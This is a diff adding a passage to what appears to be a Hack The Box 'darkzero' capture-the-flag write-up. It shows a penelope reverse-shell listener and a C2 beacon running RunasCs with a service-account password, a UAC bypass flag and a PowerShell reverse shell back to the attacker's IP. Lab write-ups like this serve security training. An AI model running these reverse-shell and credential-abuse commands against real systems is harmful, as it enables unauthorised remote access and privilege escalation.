@@ -707,5 +707,30 @@ darkzero-ext\svc_sql
 As seen here i can now authenticate with logon type 5 (service logon)
 
 ```python
-
+penelope -p 1338
+[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
+
+So ill set another listener
+
+```python
++--- Task [bd30d2e5] closed ----------------------------------------------------------+
+
+[20/08 21:35:31] ethan [7d32cbbf] beacon > execute-assembly /home/kali/htb/darkzero/RunasCs.exe svc_sql Password123! -d darkzero.ext -l 5 --bypass-uac powershell -r 10.10.14.61:1338
+[20/08 21:35:31] [*] Task: execute .NET assembly
+[20/08 21:35:35] [*] Agent called server, sent [61.66 Kb]
+[20/08 21:35:36] [+] BOF output
+
+
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-2a43f$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2660 created in background.
+[20/08 21:35:36] [+] BOF finished
+
++--- Task [7d32cbbf] closed ----------------------------------------------------------+
+```
+
+Ill then use my beacon to execute runascs shell using the logon type 5
+
